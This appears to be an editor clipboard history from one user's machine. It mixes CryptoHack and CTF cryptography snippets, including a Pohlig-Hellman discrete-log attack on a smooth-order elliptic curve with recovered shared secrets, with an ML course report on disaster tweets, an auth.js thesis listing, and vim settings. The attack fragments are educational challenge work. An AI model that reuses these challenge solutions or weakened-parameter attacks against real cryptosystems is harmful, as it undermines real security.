	B: 652888676809466256406904653886313023288609075262748718135045355786028783611182379919130347165201199876762400523413029908630805888567578414109983228590188758171259420566830374793540891937904402387134765200478072915215871011267065310188328883039327167068295517693269989835771255162641401501080811953709743259493453369152994501213224841052509818015422338794357540968552645357127943400146625902468838113443484208599332251406190345653880206706388377388164982846343351
ada9bc65dbc266bb1d0e40e26d3e4791|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|6|18|v|text
	f60522a95bde87a9ff00dc2c3d99177019f625f3364188c1058183004506bf96541cf241dad1c0e92535564e537322d7
9674e0b9cb70662baf02b3718c8f155e|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|3|1|V|text
	A: 539556019868756019035615487062583764545019803793635712947528463889304486869497162061335997527971977050049337464152478479265992127749780103259420400564906895897077512359628760656227084039215210033374611483959802841868892445902197049235745933150328311259162433075155095844532813412268773066318780724878693701177217733659861396010057464019948199892231790191103752209797118863201066964703008895947360077614198735382678809731252084194135812256359294228383696551949882
54c217549288eee9168f0e9fea6cbc90|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|1|1|V|text
	p: 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919
3b55b87445992185ddc682b1fbff176a|file:///home/neo/CTFs/scripts/crypto/pohlig-hellman.sage|36|1|V|python
	p = 0xde26ab651b92a129
2e11ff99fff20e1a3d366d86885c189a|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|4|4|v|text
	652888676809466256406904653886313023288609075262748718135045355786028783611182379919130347165201199876762400523413029908630805888567578414109983228590188758171259420566830374793540891937904402387134765200478072915215871011267065310188328883039327167068295517693269989835771255162641401501080811953709743259493453369152994501213224841052509818015422338794357540968552645357127943400146625902468838113443484208599332251406190345653880206706388377388164982846343351
e81a432fe6df67fd1d1258f02733b912|file:///home/neo/Documents/epl448/ResultsANALysis.txt|1|1|V|text
	Based on the results we got (check table below) we made assumptions on the three following subjects.
09b4dd8d2fbdafb58fe63aad2bf8542c|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|199|30|v|tex
	check table below
57cd98943d09d328b12c343e713d1456|file:///home/neo/Documents/epl448/ResultsANALysis.txt|3|1|V|text
	Best preprocessing methods to use:
b9ec9d160328000db7e6051fd6a2d0b8|file:///home/neo/Documents/epl448/ResultsANALysis.txt|5|1|V|text
	The preprocessing methods that give the highest scores in most of the runs are lemmatize, clear and dense data.
	Each of the vectorizer methods (tfidf / counter) can work efficiently in some models.In all the models, except one, the vectorizer method remained the same , which means that both work well occasionally.
	Using keywords can somehow affect the result in some models but generally it doesn't have a huge impact on the score.
	Using locations was not effective at all, it was used only in one method to produce a high score.
	Stemmed data seem to be effective in only a few models making them way less effective than lemmatized data.
e1bb26cf95bfb6cd56a14c06fffbca61|file:///home/neo/Documents/epl448/ResultsANALysis.txt|11|9|v|text
	lemmatize / clear data / dense data / tfidf vectorizer / counter vectorizer
b666354a2f970c59a5effd3b634e1556|file:///home/neo/Documents/epl448/ResultsANALysis.txt|12|11|v|text
	keywords  / stem
f3d6f2c0eb8b5c70502bdb19c59a7de0|file:///home/neo/Documents/epl448/ResultsANALysis.txt|18|1|V|text
	Running preprocessing methods first gives better scores than running parameters first.
	Also in most cases it was more efficient to run preprocessing methods first to reduce the number of combinations created.
	This issue can be resolved with huge amounts of processing power to run all the combinations together.
	In our case it was impossible to test the experiments this way due to the fact that some models have mor than 16000 (2 ^ 14) different combinations if both preprocessing methods and parameters are used together.
	Accuracy on results could be improved furthermore by trying out more parameters on each model which also requires huge amounts of processing power.
0213dd102b3446cff490c03cb15e602d|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|220|49|v|tex
	furthermore 
5e7e984044c40bfe0d8f3da36c365855|file:///home/neo/Documents/epl448/ResultsANALysis.txt|24|1|V|text
	Changes on preprocessing methods and parameters based on first run:
f8ac0ae7e52b0c2f8debda9e847edfaa|file:///home/neo/Documents/epl448/ResultsANALysis.txt|26|1|V|text
	As mentioned before we tested running preprocessing methods first and then parameters first to see how it affects the results.
	Preprocessing methods are not affected so much by the order of the run but still 1/4 of the results was differnt based on run order.
	On the other hand parameters are changed dramatically by the order of run, 1/2 of the results was different based on run order.
	One reason for this is that parameters in some models have small differences between them.
	For example some constant values used by the models can take the values 1.0, 1.1 and 1.2, which doesn't affect the result a lot.
	Also parameters such as learning rates are not affecting the score much which may lead to two different learning rates be presented as the best. 
	These lead us to the conclusion that to have accurate results we need to run the script both ways. 
	As mentioned before the best way to solve these issues is to test all the possible combinations at one run.
dcfbb6061a04e71657a3a3b124c36656|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|5|13|v|python
	69w6
704cddc91e28d1a5517518b2f12bc321|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|5|7|v|python
	8045
3cffc848277b980ba850e101c3ce34fa|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|9|9|V|python
	print(P == E(0))
	print(P)
a51010028af5dc9e12c5838e5db1caee|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|9|1|V|python
	print(P[0])
70a17ffa722a3985b86d30b034ad06d7|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|15|9|v|python
	order
e104ca7eb18dfbb74fae31fe985b4bb9|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|15|9|v|python
	cardinality
d9700fe760041f8b434d33dc52e8c5b9|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|15|1|V|python
	print(E.category())
e9cc2fa50adeacd11982e65e9179b9ad|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|23|1|V|python
	P = E(493, 5564)
d0d33c63402dfb2c02713a7fd52578c1|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|26|1|V|python
	print()
7b9cca49d98ab0e3bd139f522e0a939b|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|25|1|V|python
	print(X[0])
15622858421c74cf81a32d7f02718427|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|12|1|V|python
	    print(x1)
97558655f0c5d393fb1e8b974d5d46c0|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|12|11|V|python
	    print(x1)
	    print(y1)
	    print(x2)
	    print(y2)
92f1ccef69fae3ed459856481f14a22f|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|16|15|V|python
	        print(x2)
	        print(x1)
	        print(x2-x1)
	        print(p)
b4f80b3917cc3440041793c8d3352ed9|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|12|5|V|python
	    print(inverse_mod(x2 - x1, p))
ead1e974f240aabc3e216c1c3a36d0ec|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|19|9|V|python
	        print(inverse_mod(3395, 9739))
3699135b16791c5cbdce203bdf69e9fe|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|18|9|V|python
	        print(p)
e0151117b79f3e8b1c09e0d5d32023b7|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|17|9|V|python
	        print(x2-x1)
11724e63c7208bab701ec4e4f7447770|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|16|9|V|python
	        print(x1)
e67c28b434f8e601a7ce8d53110872cd|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|15|9|V|python
	        print(x2)
d597083f627db0582373ae98c87a543a|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|25|1|V|python
	assert point_addition(X, Y, E) == E(1024, 4440)
a0faef0851b4294c06f2b94bb1cb2044|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|8|10|v|python
	Integer
f97f36c4a6f72da78e9fc2ed60e3d70f|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|24|1|V|python
	print(E.modulus())
e98fba49276da81c62ceccf26ec44287|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|32|1|V|python
	tot = point_addition(P, P, E)
fd7a7e0bc707959502553ef1f07ceda4|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|33|1|V|python
	tot = point_addition(tot, Q, E)
7945a60dac6e56d3527772e1178049d2|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|13|1|V|python
	    print(x1, x2, y1, y2)
7f068be8ebbaad6581a9bdf2a0b5be0f|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|2|1|V|python
	    p = 9739
c70341de2c112a6b3496aec1f631dddd|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|47|12|v|python
	6931
03f544613917945245041ea1581df0c2|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|47|6|v|python
	1089
d893b22b80059de60607e6b04824e190|file:///home/neo/cryptohack/elliptic-curves/starter/starter.sage|49|1|V|python
	print(X * 1337)
1ba7ab7ee06c05885f058655604276bf|file:///home/neo/CTFs/scripts/crypto/roca/optimization.py|6|1|V|python
	from sage.all_cmdline import *                        # Used for coppersmith
77fec40c8f87b04a65b2dcbfdeb9a767|file:///home/neo/cryptohack/elliptic-curves/starter/curves_logs.py|11|29|v|python
	secret_point[0]
b80eb4e0e849af849ea960c43af2b564|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|29|22|v|python
	9739
55c58f9c4a27416e9fe210516e02874d|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|28|1|V|python
	p = 9739
	E = EllipticCurve(GF(p), [497, 1768])
	G = E(1804,5368)
	R = IntegerModRing(p)
	q_x = 4726
	y_sqr = InteerMod(R, q_x ^ 3 + 497 * q_x + 1768)
	if pow(y_sqr, (p-1)//2, p) == 1:
	    q_y = pow(y_sqr, (p-1)//4, p)
	Q = E(q_x, q_y)
	n = 6534
	shared_secret = Q * n
6775d0bbcd25a39b70b943bf18ae7059|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|29|1|V|python
	p = 9739
	E = EllipticCurve(GF(p), [497, 1768])
	G = E(1804,5368)
	R = IntegerModRing(p)
	q_x = 4726
	y_sqr = InteerMod(R, q_x ^ 3 + 497 * q_x + 1768)
	if pow(y_sqr, (p-1)//2, p) == 1:
	    q_y = pow(y_sqr, (p+1)//4, p)
	Q = E(q_x, q_y)
	n = 6534
	shared_secret = Q * n
9110ed40d8d5bcb9d749482a092522e8|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|29|1|V|python
	p = 9739
	E = EllipticCurve(GF(p), [497, 1768])
	G = E(1804,5368)
	R = IntegerModRing(p)
	q_x = 4726
	y_sqr = IntegerMod(R, q_x ^ 3 + 497 * q_x + 1768)
	if pow(y_sqr, (p-1)//2, p) == 1:
	    q_y = pow(y_sqr, (p+1)//4, p)
	Q = E(q_x, q_y)
	n = 6534
	shared_secret = Q * n
46828b115eb4c3df2a03bd5c5e7a0b60|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|89|5|v|python
	310717010502520989590157367261876774703
2eed61188a4f1deddcfcbe43b8e32314|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|94|7|v|python
	179210853392303317793440285562762725654
07a38dbd83239da391442b5fb0fc691e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|95|7|v|python
	105268671499942631758568591033409611165
72b3c41cdcb9c9ebbc4f243350a90659|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_6cf0cf5ca7ab93bb829e557dd77e08ff.txt|1|9|v|text
	280810182131414898730378982766101210916
3af74c1b0fbf1009486e77a25a7da01f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_6cf0cf5ca7ab93bb829e557dd77e08ff.txt|1|52|v|text
	291506490768054478159835604632710368904
efd7e8a154fa4000c60d56e1836877e5|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|233|16|V|tex
	\begin{table}[]
	\begin{tabular}{cllll}
	\hline
	Model                                     & Preprocessing methods                                                                                         & Parameter values                                                                                                        & Cross validation average score & Kaggle Score                 \\ \hline
	\multicolumn{1}{|c|}{Logistic Regression} & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}Dense, countvec, \\ clear data, lemmatize\end{tabular}}        & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}freq = 15 \\ solver = sag \\ penalty = l2 \\ c = 1.1\end{tabular}}       & \multicolumn{1}{l|}{0.756487}  & \multicolumn{1}{l|}{0.79447} \\ \hline
	\multicolumn{1}{|c|}{SVC}                 & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data, \\ stem, lemmatize\end{tabular}}  & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}freq =15 \\ kernel =rbf \\ c = 1.5\end{tabular}}                         & \multicolumn{1}{l|}{0.759635}  & \multicolumn{1}{l|}{0.80265} \\ \hline
	\multicolumn{1}{|c|}{MultinomialNB}       & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}Dense, tfidf, Clear data, \\ lemmatize, keywords\end{tabular}} & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}freq = 15 \\ alpha = 0.1\end{tabular}}                                   & \multicolumn{1}{l|}{0.750952}  & \multicolumn{1}{l|}{0.77914} \\ \hline
	\multicolumn{1}{|c|}{SGDClassifier}       & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data,\\  stem, Lemmatize\end{tabular}}  & \multicolumn{1}{l|}{\begin{tabular}[c]{@{}l@{}}freq = 20 \\ loss = hinge  \\ penalty = l2 \\ ratio = 0.15\end{tabular}} & \multicolumn{1}{l|}{0.754956}  & \multicolumn{1}{l|}{0.78425} \\ \hline
	BernoulliNB                               & \begin{tabular}[c]{@{}l@{}}Dense, tfidf,  clear data, \\ stem, lemmatize, keywords\end{tabular}               & \begin{tabular}[c]{@{}l@{}}freq = 15\\ alpha = 1.0\end{tabular}                                                         & 0.751552                       & 0.78118                      \\ \hline
	\end{tabular}
	\end{table}
20e1d10f87ffab4c5db21f18f515f7a1|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|104|1|V|tex
	\begin{lstlisting}[caption={JavaScript code that uses {\tt auth.js} API to generate the credential and submit the reset password form}, label={lst:reset_pass}]
	jQuery("#resetpassform").on("submit", function (e) {
	    e.preventDefault(); //Stop form submission
	    let self = jQuery(this);
	    initializeCredentialType({
	     passwordMinLength: 8,
	     passwordProccessMethod: "plain",
	    });
	    let password = jQuery("#pass1").val();
	    let public_key = register(password); //Generate the credential using auth.js
	    public_key.then( (pk) => {
	        console.log(pk);
	        jQuery("#pass1").val(pk); //Set the new credential value to be submitted
	        jQuery("#pass2").val(pk);
	        jQuery("#resetpassform").off("submit");
	        self.submit();//Submit the form
	    })
	});
	\end{lstlisting}
b84d347ebc2afcbe7161216109daed28|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|139|1|V|tex
	\begin{lstlisting}[language=PHP, caption={wp\_authenticate\_username\_password, one of the default authentication functions used in WordPress}, label={lst:wp_authenticate}]
	function wp_authenticate_username_password( $user, $username, $password ) {
	
		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_password',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: The password you entered for the username %s is incorrect.' ),
					'<strong>' . $username . '</strong>'
	                ...
	    }            
	...
	}
	\end{lstlisting}
3e23472d146edc6643e8c05a1856a3ce|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|170|660|v|tex
	Depending on the script's output, the authentication is either successful and the user is logged in, or the user is given a response that the authentication has failed.
d32f72518ffff92615dd87de4cba1ceb|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|170|219|v|tex
	firstly
1ea24b39ad0dd2708371255e87afa4c2|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|170|219|v|tex
	splits 
308c631d3a38bd9f5823d20478ff2537|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|122|829|v|tex
	same nonce is also attached on the login form as a cookie. 
a85a0bbd13462c10ee5102187fd14978|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|162|3|V|tex
					/* translators: %s: User name. */
c2db192392a71f5281951164bda5b345|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|89|1|V|python
	p = 310717010502520989590157367261876774703
8637f29bcb5d7fcf21352e7730f34613|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|94|1|V|python
	g_x = 179210853392303317793440285562762725654
	g_y = 105268671499942631758568591033409611165
cd009ee248b4162ddbd8aafe33aa98bc|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|106|1|V|python
	b_x = 272640099140026426377756188075937988094
	b_y = 51062462309521034358726608268084433317
a2f4de2beb4b9e062c486955a98f44ae|file:///home/neo/.vimrc|28|1|V|vim
	noremap <silent> <C-left> :vertical resize +3<CR>
811882fecd5c7618d7099ebbd39ea254|file:///home/neo/.vimrc|29|21|v|vim
	left
e6dec152d6a941fccb0a5e8cc2579cc3|file:///home/neo/.vimrc|30|26|v|vim
	vertical
6981347c6a2682bd4941141773687ec6|file:///home/neo/.vimrc|30|1|V|vim
	noremap <silent> <C-Up> :resize +3<CR>
d3a229d98956324048cdf7c44b94b164|file:///home/neo/.vimrc|36|1|V|vim
	map <leader>th <C-w>t<C-w>H
c9f419c6e24d25b3b0628879397fba27|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|89|1|V|python
	p = 310717010502520989590157367261876774703
	a = 2
	b = 3
e40f72b0677eb645c19220134c129a00|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|18|1|V|python
	print('test')
15d205af7c3255d114af3c871b64eb9b|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|23|1|V|python
	print(a)
742f32c65ffd18b766fa307f8de2d47d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|25|40|v|python
	factor
2f16a5968ab4856655ce5262e057758a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|24|5|V|python
	    P_tmp = 
153b8dc70fac8c50f24e674bf17b4e6d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|25|1|V|python
	    P_tmp = co_factors * P
ed98b8de568f9b046cdc811a114e5479|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|23|1|V|python
	print(co_factors_lst)
903946f9f5eff958e5b975dec0acf86c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|25|5|V|python
	    print(co_factors)
e151395da2f585cbc55f4055d4e5f679|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|25|5|V|python
	    co_factors = list(co_factors)
761b0429f9896c266de6f2885e2d06ed|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|27|5|V|python
	    print(tmp_ord)
e76f1cdb206a05a2e55b7cc4959cf82e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|27|21|V|python
	    tmp_ord = list(factors - co_factors)[0]
	    prod = 
570bfd213c05cef1af17557cd2440703|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|28|5|V|python
	    prod = 
3137d232bb3bb2ef061340c443af97f9|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|29|13|v|python
	co_factors
f5bf48aa40cad7891eb709fcf1fde128|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|29|13|v|python
	product
2536cf98876c9233a9c7137a4170e44f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|3|1|V|python
	from math import product
3c39aa7ad016b0d509d8e37d36c96d56|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|29|12|v|python
	(co_factors)
65c8ecd28eb5bc033d3444a07616f9bc|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|6|1|V|python
	p = 310717010502520989590157367261876774703
	a = 2
	b = 3
	E = EllipticCurve(GF(p), [a,b])
	
	g_x = 179210853392303317793440285562762725654
	g_y = 105268671499942631758568591033409611165
	G = E(g_x, g_y)
	
	b_x = 272640099140026426377756188075937988094
	b_y = 51062462309521034358726608268084433317
	B = E(g_x, g_y)
	
	n = E.order()
	
	factors = set(ecm.factor(n))
488b3e34e66ae0e5237d6f83358aecec|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|39|1|V|python
	a = [1, 1, 1, 1, 1, 1, 1]
	b = [2, 3, 139, 165229, 31850531, 270778799, 179317983307]
e5b76efede6935947e80422866e0634f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|35|5|V|python
	    # if prod != 787032828908966823749412762:
2e7069823d8186a67eb3520cafb93465|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|6|1|V|python
	p = 310717010502520989590157367261876774703
	a = 2
	b = 3
	E = EllipticCurve(GF(p), [a,b])
	
	g_x = 179210853392303317793440285562762725654
	g_y = 105268671499942631758568591033409611165
	G = E(g_x, g_y)
	
	b_x = 272640099140026426377756188075937988094
	b_y = 51062462309521034358726608268084433317
	B = E(g_x, g_y)
8cf88474934d98d7e133cd7a800ffd55|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|6|1|V|python
	p = 310717010502520989590157367261876774703
	a = 2
	b = 3
	E = EllipticCurve(GF(p), [a,b])
	
	g_x = 179210853392303317793440285562762725654
	g_y = 105268671499942631758568591033409611165
	G = E(g_x, g_y)
	
	b_x = 272640099140026426377756188075937988094
	b_y = 51062462309521034358726608268084433317
	B = E(b_x, b_y)
729476a641a20436b8ee2b59f0db08bb|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|38|1|V|python
	a = [1, 1, 1, 1, 1, 1, 1]
28a472aaaf103219b19697adf897865e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|38|1|V|python
	b = [2, 3, 139, 165229, 31850531, 270778799, 179317983307]
b85cc38673fba9d3acaf239b07fc64d3|file:///home/neo/CTFs/scripts/crypto/pohlig-hellman.sage|38|1|V|python
	p = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919
17e7e84c559e8abb57e120df99f74bcb|file:///home/neo/CTFs/scripts/crypto/pohlig-hellman.sage|38|44|v|python
	31850531
66523d5ea96d187f993f3ba145275d88|file:///home/neo/CTFs/scripts/crypto/pohlig-hellman.sage|39|5|v|python
	310717010502520989590206149059164677804
c8a1e7ed2d0510ae14f9dd8189e2ef96|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|4|1|V|python
	p = 310717010502520989590157367261876774703
	a = 2
	b = 3
	E = EllipticCurve(GF(p), [a,b])
	
	g_x = 179210853392303317793440285562762725654
	g_y = 105268671499942631758568591033409611165
	G = E(g_x, g_y)
	
	b_x = 272640099140026426377756188075937988094
	b_y = 51062462309521034358726608268084433317
	B = E(b_x, b_y)
	
	n = E.order()
56e0ae3293d209a8a47139f7591104db|file:///home/neo/CTFs/scripts/crypto/pohlig-hellman.sage|39|1|V|python
	p = 2
9a803ea7d5bd3d62cc59b759f83dc664|file:///home/neo/CTFs/scripts/crypto/pohlig-hellman.sage|38|1|V|python
	# [2, 2, 3, 3, 3, 3, 3, 3, 3, 139, 165229, 31850531, 270778799, 179317983307]
c6b7ed918ad52b0b075a928a0d40dcc6|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|30|22|v|python
	factors
4a01b8950659e2074f2e39d54397c827|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|30|1|V|python
	a = [135039551333, 92489687, 7711332, 1737, 120]
	b = [179317983307, 270778799, 31850531, 165229, 139]
8a975b239212b6bb44ab947104ffadf3|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.sage|30|1|V|python
	a = [135039551333, 92489687, 7711332, 1737, 120, 542, 1]
	b = [179317983307, 270778799, 31850531, 165229, 139, 3^7, 2]
f5fc1ce13c1480df691f05383eec52f4|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|112|1|V|python
	shared_secret = 23364484702955482300431942169743298535
a486e5f1effd33f9be8b1c62099f6356|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|1|V|python
	# shared_secret = 1791
4ac30c52f27b2b773d208b52fe36d925|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|40|v|python
	,'cd9da9f1c60925922377ea952afc212c'
13b2c25d39a5c2d2e577d16860dabbd2|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|43|112|v|python
	}'febcbe3a3414a730b125931dccf912d2239f3e969c4334d95ed0ec86f6449ad8'
a9eb92f858a7f9647fe2e70e910415c3|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_6cf0cf5ca7ab93bb829e557dd77e08ff.txt|3|9|v|text
	07e2628b590095a5e332d397b8a59aa7
65dfa12f0ba49884ae9bc773a3585ac4|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_6cf0cf5ca7ab93bb829e557dd77e08ff.txt|3|8|v|text
	'07e2628b590095a5e332d397b8a59aa7'
9762ad213f72d89748b1fba9eed98d4c|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|40|v|python
	'9eea1eb92a63751591262ccd6ee4f342'
4159d176ab90faebec33c8a1c30ed163|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_6cf0cf5ca7ab93bb829e557dd77e08ff.txt|3|62|v|text
	'8220b7c47b36777a737f5ef9caa2814cf20c1c1ef496ec21a9b4833da24a008d0870d3ac3a6ad80065c138a2ed6136af'
de175cfc193b806b7d76e246edab6de1|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|43|112|v|python
	'b524da20f196b4fd2891b8ac5009571b68f76a3946217b05d16e1e87dfcbc0ca8c93da1186c36f5272b6fd4af6c96176'
ee2b70f7b9e4feb9a27bbd652824620d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_6cf0cf5ca7ab93bb829e557dd77e08ff.txt|1|7|v|text
	x=280810182131414898730378982766101210916, y=291506490768054478159835604632710368904
333a05f0e7777a536a2f072169538ed5|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|22|1|V|python
	G.order()
95f024249062432988a017640f65fc3c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|24|1|V|python
	# factors = [2, 2, 3, 3, 3, 3, 3, 3, 3, 139, 165229, 31850531, 270778799, 179317983307]
bb439c869c287e8f12e48b6890ced278|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|29|5|V|python
	    co_factors = set(co_factors)
3a3a8a6259cfcc2bd74a61d5e935bd3c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|30|1|V|python
	#     tmp_ord = list(factors - co_factors)[0]
f755f83e93c95ffa337c2f901178a94d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|30|1|V|python
	#     print(tmp_ord)
77a709be708fec5a9227ec4621e7db26|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|31|1|V|python
	#     print(prod)
e4fb074582e6bf8ed6a80406b81890d7|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|33|5|V|python
	    print(G_tmp)
05ffb4d625af4a0ddf7f913d810d9c14|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|37|1|V|python
	# print(a)
ea2331ca934796afd9205c1e199af5ad|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|35|1|V|python
	    # a.append(discrete_log_rho(G_tmp,B_tmp, ord=tmp_ord, operation='+'))
99e69e89e46bdc853624bfabd0a64ad6|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|112|1|V|python
	shared_secret = 47836431801801373761601790722388100620
975bf08e31295898cd0c210083b75f71|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smooth.py|11|1|V|python
	p = 310717010502520989590157367261876774703
	a = 2
	b = 3
	E = EllipticCurve(GF(p), [a,b])
	
	g_x = 179210853392303317793440285562762725654
	g_y = 105268671499942631758568591033409611165
	G = E(g_x, g_y)
	
	x=280810182131414898730378982766101210916
	y=291506490768054478159835604632710368904
	P = E(x,y)
d5c63d85dbb7defdfae5cff810f8d46d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/source.py|112|17|v|python
	47836431801801373761601790722388100620
93e63c89436957fc0c50a0e8f96738ad|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|1|14|v|text
	034712809375537908102988750113382444008758539448972750581525810900634243392172703684905257490982543775233630011707375189041302436945106395617312498769005 
89840bf2ea51bac538e68e6e6320f5d4|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|1|13|v|text
	3034712809375537908102988750113382444008758539448972750581525810900634243392172703684905257490982543775233630011707375189041302436945106395617312498769005 
2884c033e4b7e8fae0b7d7b4e0ff8f1c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/exceptional.sage|45|1|V|python
	p = 0xa15c4fb663a578d8b2496d3151a946119ee42695e18e13e90600192b1d0abdbb6f787f90c8d102ff88e284dd4526f5f6b6c980bf88f1d0490714b67e8a2a2b77
